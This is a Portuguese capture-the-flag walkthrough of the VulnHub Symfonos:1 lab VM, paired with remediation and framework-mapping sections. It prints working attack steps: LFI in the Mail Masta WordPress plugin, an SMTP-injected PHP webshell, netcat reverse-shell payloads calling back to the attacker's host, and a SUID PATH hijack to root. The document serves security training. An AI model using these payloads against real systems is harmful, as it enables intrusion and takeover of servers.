# VulnHub Symfonos:1 — Quando o Samba Canta o Blues

Bora rapaziada!! Essa VM tem de tudo: shares SMB vazando senhas em texto puro, plugin WordPress com LFI suculenta, log poisoning via SMTP para transformar esse LFI em RCE, e um binário SUID com chamada relativa de PATH que te entrega o root de bandeja. Symfonos:1 é uma cadeia caprichada do nível iniciante-intermediário que mapeia perfeitamente para caminhos de ataque reais em ambientes corporativos. Muito bom do autor pelo tema de mitologia grega, mano.

Muito obrigado ao **Zayotic** por montar uma VM que ensina enumeração SMB, LFI, log poisoning e PATH hijacking em uma única cadeia limpa. Esse é exatamente o tipo de máquina que aparece em labs de prática para o OSCP. Top demais.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Iniciante a Intermediário |
| **VM Alvo** | Symfonos:1 |
| **VM Atacante** | Kali Linux 2019.2 |
| **VulnHub** | https://www.vulnhub.com/entry/symfonos-1,322/ |
| **Técnicas** | Host discovery, Nmap, enumeração SMB (enum4linux, smbclient), enumeração WordPress (WPScan), LFI via plugin Mail Masta (EDB-40290), log poisoning SMTP, reverse shell, SUID binary PATH hijack, escalação de privilégios |
| **CVEs** | Sem CVE única para LFI do Mail Masta (Exploit-DB 40290). SMB EternalBlue CVE-2017-0144 presente em configurações SMB antigas. |

---

## Resumo do Ataque

```
[arp-scan / nmap: 192.168.x.x]
    |
    v
[nmap: 21/ftp, 22/ssh, 25/smtp, 80/http, 139+445/smb]
    |
    v
[enum4linux: usuários -> helios; shares -> anonymous, helios]
    |
    v
[smbclient anonymous: attention.txt (dica de senha)]
    |
    v
[smbclient helios (senha: qwerty): todo.txt -> caminho WordPress /h3l105]
    |
    v
[/etc/hosts: 192.168.x.x symfonos.local]
    |
    v
[WPScan: plugin Mail Masta -> LFI via count_of_send.php (EDB-40290)]
    |
    v
[LFI confirmada: ?pl=/etc/passwd]
    |
    v
[Log poisoning SMTP: telnet 25 -> injeção de webshell PHP em /var/mail/helios]
    |
    v
[LFI + log envenenado: ?pl=/var/mail/helios&c=id -> RCE como www-data]
    |
    v
[Reverse shell via comando nc em URL -> nc -lvp 1234]
    |
    v
[Shell www-data: find SUID -> /opt/statuscheck]
    |
    v
[strings /opt/statuscheck: chamada relativa de "curl" -> PATH hijack]
    |
    v
[cd /tmp; echo "/bin/sh" > curl; chmod 777 curl; export PATH=/tmp:$PATH; /opt/statuscheck]
    |
    v
[ROOT -> cat /root/proof.txt]
```

---

## Metodologia

1. Host discovery e scan completo de portas com Nmap
2. Enumeração SMB: shares, usuários e credenciais em texto puro
3. Descoberta do WordPress e enumeração de vulnerabilidades em plugins
4. Exploração de LFI via plugin Mail Masta (EDB-40290)
5. Log poisoning SMTP para alcançar RCE via LFI
6. Reverse shell como www-data
7. Descoberta de binário SUID e PATH hijack para escalação de privilégios

---

## Passo 1 — Identificando o Alvo

Host discovery padrão na rede do laboratório:

```bash
# Opção 1: arp-scan (rápido, recomendado para redes locais)
arp-scan --localnet --ignoredups

# Opção 2: nmap ping scan
nmap -sn -T5 192.168.0.0/24
```

Note o IP alvo nos resultados. Neste walkthrough é `192.168.0.16`, mas o seu pode ser diferente.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Passo 2 — Reconhecimento e Enumeração de Serviços

```bash
nmap -A -T4 -p- 192.168.0.16
# -A: OS/versão/scripts/traceroute
# -T4: timing agressivo
# -p-: todas as portas
```

Saída esperada (portas principais):

```
21/tcp  open  ftp      vsftpd 2.3.5
22/tcp  open  ssh      OpenSSH 7.4p1 Debian
25/tcp  open  smtp     Postfix smtpd
80/tcp  open  http     Apache httpd 2.4.25 (Debian)
139/tcp open  netbios-ssn Samba smbd 3.X-4.X
445/tcp open  netbios-ssn Samba smbd 4.5.16
```

Temos SMB (445) e SMTP (25). Duas superfícies muito interessantes em uma máquina web. ( ͡° ͜ʖ ͡°)

> **Nota do mundo real:** Exposição de SMB em hosts Linux rodando Samba é uma superfície de ataque significativa. O EternalBlue (CVE-2017-0144) explorou SMB para espalhar o ransomware WannaCry em 2017, afetando mais de 200.000 máquinas globalmente. O Lazarus Group (APT38) e vários operadores de ransomware usam enumeração SMB como passo rotineiro no movimento lateral. Referência: https://attack.mitre.org/software/S0366/

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1046 Network Service Discovery] [T1039 Data from Network Shared Drive]

---

## Passo 3 — Enumeração SMB: Shares, Usuários e Credenciais

> **O que é enumeração SMB?**
> Server Message Block (SMB) é um protocolo de compartilhamento de arquivos em rede. Misconfigurations como shares anônimas ou credenciais fracas são extremamente comuns e têm sido abusadas por atores de ameaça desde pelo menos os anos 2000. Ferramentas como enum4linux automatizam a extração de usuários, shares e políticas.
> Referência: https://www.samba.org/

```bash
enum4linux 192.168.0.16
# Enumera shares, usuários, grupos, políticas de senha
```

Saída principal a notar:

```
user:[helios] rid:[1000]

//192.168.0.16/anonymous
//192.168.0.16/helios
```

Conecte-se à share anônima (sem senha):

```bash
smbclient //192.168.0.16/anonymous
# senha: <só pressione Enter>
smb: \> ls
smb: \> get attention.txt
```

Leia o `attention.txt`:

```
Can users please stop using passwords like 'qwerty' or 'password'!
Sincerely, Zeus
```

Nossa! Isso é uma dica de senha bem explícita. ( ͡° ͜ʖ ͡°)

Agora conecte-se à share `helios` com a senha sugerida:

```bash
smbclient //192.168.0.16/helios -U helios
# senha: qwerty
smb: \> ls
smb: \> get todo.txt
```

Leia o `todo.txt`:

```
1. Add users
2. Fix WordPress issues
3. Access portal at /h3l105
```

**Credenciais: helios:qwerty** e o caminho WordPress é `/h3l105`. ᕕ( ᐛ )ᕗ

Você também pode usar `smbmap` como alternativa:

```bash
smbmap -H 192.168.0.16 -u anonymous
smbmap -H 192.168.0.16 -u helios -p qwerty
```

> **Nota do mundo real:** Shares SMB anônimas vazando caminhos internos e senhas são um achado recorrente em pentests corporativos. A cadeia de pós-exploração do Hafnium (Microsoft Exchange) em 2021 frequentemente envolvia enumeração de shares SMB para localizar credenciais e caminhos de movimento lateral. Referência: https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/

> **MITRE ATT&CK:** [TA0007 Discovery] [T1039 Data from Network Shared Drive] [T1552.001 Unsecured Credentials: Credentials in Files]

---

## Passo 4 — Enumeração do WordPress

Adicione o hostname ao arquivo hosts para que o WordPress carregue corretamente:

```bash
echo "192.168.0.16    symfonos.local" >> /etc/hosts
```

Acesse `http://symfonos.local/h3l105/`. Instalação WordPress confirmada.

Enumere os plugins instalados:

```bash
wpscan --url http://symfonos.local/h3l105/ --enumerate p
# --enumerate p: enumera plugins
```

O WPScan sinaliza o **plugin Mail Masta** como instalado. Uma busca rápida revela:

- Exploit-DB 40290: Local File Inclusion no `mail-masta` 1.0
- A vulnerabilidade está em `count_of_send.php` que passa o parâmetro `pl` diretamente para `include()` sem sanitização.

> **O que é Local File Inclusion (LFI)?**
> LFI ocorre quando uma aplicação web usa entrada controlável pelo usuário para especificar um caminho de arquivo para operações `include()` ou `require()` em PHP. Um atacante pode percorrer o sistema de arquivos e ler arquivos sensíveis como `/etc/passwd`, `/var/log/apache2/access.log` ou logs de e-mail.
> CWE-98: Improper Control of Filename for Include/Require Statement
> Referência: https://owasp.org/www-project-web-security-testing-guide/

> **MITRE ATT&CK:** [TA0007 Discovery] [T1518 Software Discovery]

---

## Passo 5 — LFI via Plugin Mail Masta (EDB-40290)

Teste a LFI solicitando `/etc/passwd`:

```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

Saída esperada no browser: conteúdo do `/etc/passwd`. LFI confirmada. ✓

```
root:x:0:0:root:/root:/bin/bash
...
helios:x:1000:1000::/home/helios:/bin/bash
```

Também tente ler o log de e-mail do `helios` para ver o formato:

```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
```

Se o arquivo existir e for legível pelo `www-data`, você verá o conteúdo da caixa de entrada. Esse é nosso alvo de injeção.

> **Nota do mundo real:** Vulnerabilidades LFI em plugins WordPress são consistentemente ranqueadas entre as vulnerabilidades críticas mais comuns. O APT41 usou vulnerabilidades LFI em PHP contra aplicações web como parte do acesso inicial em múltiplas campanhas documentadas. Referência: https://www.fireeye.com/current-threats/apt-groups/rpt-apt41.html

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1190 Exploit Public-Facing Application] [CWE-98]

---

## Passo 6 — Log Poisoning SMTP: De LFI para RCE

> **O que é SMTP log poisoning?**
> Agentes de Transferência de E-mail (como o Postfix) registram interações SMTP, incluindo dados dos campos `MAIL FROM` e corpo da mensagem. Se o arquivo de log de e-mail for legível pelo usuário do servidor web E uma aplicação PHP incluí-lo via LFI, um atacante pode injetar código PHP no log enviando um e-mail especialmente criado. Quando a LFI carrega o log, o interpretador PHP executa o código injetado.
> Referência: https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/

Injete um payload webshell PHP no log SMTP via telnet:

```bash
telnet 192.168.0.16 25
```

```
HELO symfonos.local
MAIL FROM: attacker@evil.com
RCPT TO: helios
DATA
<?php system($_GET['c']); ?>
.
QUIT
```

Agora dispare o código injetado via LFI. Primeiro, teste com `id`:

```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id
```

Saída esperada na página: `uid=33(www-data) gid=33(www-data)`. RCE confirmada! (☞ﾟヮﾟ)☞

Agora obtenha um reverse shell adequado. Inicie o listener no Kali:

```bash
nc -lvp 1234
```

Dispare o reverse shell via LFI (substitua espaços com `+`):

```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc+-e+/bin/sh+192.168.0.10+1234
```

Se `nc -e` não estiver disponível, use o método de pipe:

```
&c=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.0.10+1234+>/tmp/f
```

Shell recebido como `www-data`. Melhore-o:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

> **MITRE ATT&CK:** [TA0002 Execution] [T1059.004 Unix Shell] [T1505.003 Web Shell]

---

## Passo 7 — Escalação de Privilégios: SUID PATH Hijack

A partir do shell www-data, procure binários SUID:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Saída notável:

```
/opt/statuscheck
```

Investigue:

```bash
strings /opt/statuscheck
```

O binário chama `curl` sem caminho absoluto. É o mesmo padrão do Zeus:1: hora do PATH hijack. ( ͡° ͜ʖ ͡°)

```bash
cd /tmp

# Crie um "curl" falso que spawna um shell
echo "/bin/sh" > curl
chmod 777 curl

# Coloque /tmp no início do PATH para que nosso curl falso seja encontrado primeiro
export PATH=/tmp:$PATH

# Execute o binário SUID: ele chama "curl", encontra o nosso, executa sh como root
/opt/statuscheck
```

```
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

**Root!** ᕕ( ᐛ )ᕗ

```bash
cat /root/proof.txt
```

> **Referência GTFOBins:** PATH hijacking em binários SUID que chamam comandos externos está extensamente documentado. Referência: https://gtfobins.github.io/

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.001 Setuid and Setgid] [T1574.007 Path Interception by PATH Environment Variable]

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Onde Encontrado | Crackeado/Usado |
|------|-------|-----------------|----------------|
| Credencial | `helios:qwerty` | SMB share anonymous/attention.txt | Acesso à share SMB helios |
| Divulgação de caminho | `/h3l105` | SMB helios/todo.txt | URL do WordPress |
| Flag root | Ver `/root/proof.txt` | `/root/proof.txt` | Objetivo final |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|----------------|
| 1 | Share SMB anônima vazando senhas em texto puro | Misconfiguration crítica comum em deployments Samba corporativos: acesso de convidado nunca deve ser habilitado em shares com dados sensíveis | Desabilitar acesso anônimo/convidado no SMB, exigir autenticação, usar assinatura SMB |
| 2 | Plugin WordPress Mail Masta com LFI (EDB-40290) | Plugins WordPress vulneráveis são um dos vetores de acesso inicial mais comuns em pentests de aplicações web e brechas reais | Manter plugins atualizados, remover plugins não utilizados, usar WAF que bloqueie padrões de path traversal |
| 3 | Log poisoning SMTP via LFI | Qualquer LFI que possa alcançar um arquivo de log com conteúdo injetável em PHP se torna RCE: logs de e-mail, logs Apache, arquivos de sessão | Restringir permissões de leitura do servidor web em diretórios de log; desabilitar execução PHP em /var/mail |
| 4 | Binário SUID chamando `curl` por caminho relativo | Binários SUID chamando programas externos por nome relativo são escalação de privilégios por design | Sempre usar caminhos absolutos em programas SUID; auditar com `find / -perm -u=s` regularmente |

**Por que isso importa fora do lab?**

A cadeia LFI para RCE via log poisoning está documentada em numerosos comprometimentos reais de WordPress. Em 2020, uma campanha direcionada a sites WordPress com plugins vulneráveis usou exatamente esse padrão para implantar cryptominers e webshells em escala. O Lazarus Group usa enumeração SMB como procedimento operacional padrão nas fases de movimento lateral. Para defensores: um WAF bloqueando padrões de traversal `../` e permissões restritas em logs de e-mail teriam quebrado essa cadeia no Passo 5.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Active Scanning | T1595.001 |
| Descoberta | TA0007 | Network Service Discovery | T1046 |
| Descoberta | TA0007 | Data from Network Shared Drive | T1039 |
| Acesso a Credenciais | TA0006 | Unsecured Credentials in Files | T1552.001 |
| Acesso Inicial | TA0001 | Exploit Public-Facing Application | T1190 |
| Execução | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistência | TA0003 | Web Shell | T1505.003 |
| Escalação de Privilégios | TA0004 | Setuid and Setgid | T1548.001 |
| Escalação de Privilégios | TA0004 | Path Interception by PATH Environment Variable | T1574.007 |
| Coleta | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Desabilitar acesso SMB de convidado/anônimo: defina `map to guest = never` no `smb.conf`.
2. Remover ou atualizar o plugin WordPress Mail Masta; nunca passar entrada do usuário diretamente para `include()`.
3. Restringir permissões de leitura do servidor web em `/var/mail/`: `chmod 700 /var/mail/ && chown root:mail /var/mail/`.
4. Substituir `/opt/statuscheck` para chamar `/usr/bin/curl` (caminho absoluto) em vez de `curl`.
5. Remover bits SUID desnecessários de `/opt/statuscheck` se o binário não for crítico.

### Se Você Encontrar Algo Similar no Seu Ambiente

**Contenção imediata:**
- Bloquear SMB (portas 139, 445) no firewall de perímetro se exposição externa for detectada.
- Rotacionar a senha da conta `helios` imediatamente.
- Revisar includes PHP em plugins WordPress para parâmetros de caminho de arquivo não sanitizados.
- Auditar binários SUID: `find / -perm -u=s -type f 2>/dev/null`.

**Contramedidas MITRE D3FEND:**
- D3-IVA (Input Validation) para T1190 exploração de LFI
- D3-OPS (OS Process Sandboxing) para T1548.001 abuso de SUID
- D3-DA (Dynamic Analysis) para T1574.007 PATH hijacking
- D3-CTS (Credential Transmission Scoping) para T1552.001

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identificar (ID.AM): Inventariar todos os binários SUID e shares SMB acessíveis publicamente.
- Proteger (PR.AC): Desabilitar acesso anônimo a shares de arquivos; exigir autenticação.
- Detectar (DE.CM): Monitorar logs de acesso SMB e logs de erro do servidor web para padrões de path traversal.
- Responder (RS.AN): Isolar o host; rotacionar credenciais; revisar todas as permissões de shares SMB.
- Recuperar (RC.RP): Reconstruir a partir de snapshot limpo; verificar todos os arquivos da aplicação web por webshells.

**NIST SP 800-53 (Rev. 5):**
- AC-3: Controle de Acesso (restringir acesso a shares SMB)
- SI-10: Validação de Entrada (sanitizar parâmetros de include() em PHP)
- CM-7: Funcionalidade Mínima (remover bits SUID desnecessários; desabilitar SMB anônimo)
- AU-2: Log de Eventos (registrar conexões SMTP e requisições web)
- SC-28: Proteção de Informação em Repouso (restringir permissões de /var/mail)

**CISA Known Exploited Vulnerabilities:**
- CVE-2017-0144 (EternalBlue/SMBv1): não é o caminho de ataque aqui, mas relevante para hardening do Samba. Presente no catálogo KEV da CISA.
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: TECHNOLOGY
- Prática: Configuration Management
- MIL Alvo: MIL-2 (baselines de configuração gerenciadas; auditoria de SUID em runbooks padrão)

---

## Considerações Finais

Muito obrigado ao **Zayotic** por uma VM encadeada de forma bonita que abrange todas as técnicas clássicas de web mais movimento lateral em um caminho limpo. O twist SMTP para LFI é o tipo de coisa que passa despercebido em auditorias reais quando as pessoas tratam servidores de e-mail como "apenas SMTP" sem pensar no que os logs alimentam.

Se este walkthrough te ajudou, compartilha com a galera e continua hackando! top demais

*Thanks guys!! (❍ᴥ❍ʋ)*

> Artigo original em português de André Henrique: https://medium.com/@mrhenrike

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
